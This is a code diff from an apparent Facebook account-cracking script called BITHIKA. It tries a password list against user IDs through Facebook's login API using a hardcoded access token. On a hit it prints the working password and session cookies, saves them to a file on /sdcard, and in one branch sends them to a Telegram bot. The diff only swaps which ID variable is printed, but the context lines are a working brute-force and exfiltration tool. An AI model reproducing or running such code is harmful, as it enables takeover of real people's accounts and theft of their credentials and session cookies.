@@ -903,7 +903,7 @@ def api3(ids,names,passlist):
 def rndm1(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}{uid}{G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -983,17 +983,17 @@ def rndm1(uid,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         cid = str(po['uid'])
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
                                         cek_apk(coki)
                                         return True
                         elif 'access_token' in po:
                                         cid = str(po['uid'])
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        statusok = (f" {cid} | {pas} | {coki} ")
+                                        statusok = (f" {uid} | {pas} | {coki} ")
                                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                         return True
                         elif 'www.facebook.com' in po['error']['message']:
